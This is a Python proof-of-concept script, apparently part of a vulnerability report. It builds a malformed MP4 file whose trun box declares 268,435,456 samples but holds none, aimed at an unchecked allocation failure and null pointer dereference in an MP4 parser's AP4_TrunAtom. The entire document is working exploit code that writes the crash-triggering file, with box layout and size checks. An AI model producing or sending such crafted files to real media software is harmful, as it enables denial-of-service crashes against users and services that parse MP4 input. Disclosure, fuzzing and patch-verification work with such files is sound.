#!/usr/bin/env python3
"""
VULN 003 PoC Generator
AP4_TrunAtom unchecked SetItemCount failure leads to null pointer dereference.
Constructs a malformed MP4 with moof -> traf -> trun box, sample_count=0x10000000.
"""
import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_003.mp4")


def box(box_type, payload):
    """Build a box: 4-byte BE size + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def build_ftyp():
    """ftyp: brand=isom, version=0, compatible=[isom, iso2, mp41]"""
    payload = b"isom"                   # major brand
    payload += struct.pack(">I", 0)    # minor version
    payload += b"isom" + b"iso2" + b"mp41"  # compatible brands
    return box(b"ftyp", payload)


def build_mvhd():
    """mvhd version 0: 100 bytes payload -> total 108 bytes"""
    payload = b"\x00"                   # version 0
    payload += b"\x00\x00\x00"         # flags
    payload += struct.pack(">I", 0)    # creation_time
    payload += struct.pack(">I", 0)    # modification_time
    payload += struct.pack(">I", 1000) # timescale
    payload += struct.pack(">I", 0)    # duration
    payload += struct.pack(">i", 0x00010000)  # rate (1.0)
    payload += struct.pack(">H", 0x0100)      # volume (1.0)
    payload += b"\x00" * 10           # reserved
    payload += struct.pack(">III", 0x00010000, 0, 0)  # matrix row 1
    payload += struct.pack(">III", 0, 0x00010000, 0)  # matrix row 2
    payload += struct.pack(">III", 0, 0, 0x40000000)  # matrix row 3
    payload += b"\x00" * 24           # pre-defined
    payload += struct.pack(">I", 2)   # next_track_id
    return box(b"mvhd", payload)


def build_moov():
    """Minimal moov with just mvhd."""
    mvhd = build_mvhd()
    return box(b"moov", mvhd)


def build_mfhd():
    """mfhd: version(1) + flags(3) + sequence_number(4) = 8 payload bytes -> total 16"""
    payload = b"\x00"                   # version
    payload += b"\x00\x00\x00"         # flags
    payload += struct.pack(">I", 1)    # sequence_number
    return box(b"mfhd", payload)


def build_tfhd(track_id=1):
    """tfhd: version(1)+flags=0x000000(3)+track_id(4) = 8 payload bytes -> total 16"""
    payload = b"\x00"                   # version
    payload += b"\x00\x00\x00"         # flags = 0 (no optional fields)
    payload += struct.pack(">I", track_id)  # track_id
    return box(b"tfhd", payload)


def build_trun():
    """
    trun: version=0, flags=0x000001 (data_offset present)
    sample_count = 0x10000000 (trigger vulnerability)
    data_offset = 0
    No actual sample entries (the count is forged large to trigger bad_alloc / NPD).
    Payload: version(1) + flags(3) + sample_count(4) + data_offset(4) = 12 bytes
    Total box: 8 + 12 = 20 bytes
    """
    payload = b"\x00"                        # version 0
    payload += b"\x00\x00\x01"              # flags = 0x000001 (data_offset present)
    payload += struct.pack(">I", 0x10000000) # sample_count = 268435456 (malicious)
    payload += struct.pack(">i", 0)          # data_offset = 0
    return box(b"trun", payload)


def build_traf():
    """traf: tfhd + trun. size = 8 + 16 + 20 = 44"""
    tfhd = build_tfhd()
    trun = build_trun()
    return box(b"traf", tfhd + trun)


def build_moof():
    """moof: mfhd + traf. size = 8 + 16 + 44 = 68"""
    mfhd = build_mfhd()
    traf = build_traf()
    return box(b"moof", mfhd + traf)


def build_mdat():
    """Empty mdat box: size=8, no data."""
    return box(b"mdat", b"")


def main():
    ftyp = build_ftyp()
    moov = build_moov()
    moof = build_moof()
    mdat = build_mdat()

    mp4 = ftyp + moov + moof + mdat

    with open(OUT_FILE, "wb") as f:
        f.write(mp4)

    print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
    # Sanity check sizes
    print(f"    ftyp={len(ftyp)}, moov={len(moov)}, moof={len(moof)}, mdat={len(mdat)}")
    assert len(build_trun()) == 20, "trun size mismatch"
    assert len(build_tfhd()) == 16, "tfhd size mismatch"
    assert len(build_mfhd()) == 16, "mfhd size mismatch"
    assert len(build_traf()) == 44, "traf size mismatch"
    assert len(build_moof()) == 68, "moof size mismatch"
    print("[+] Box size assertions passed.")


if __name__ == "__main__":
    main()
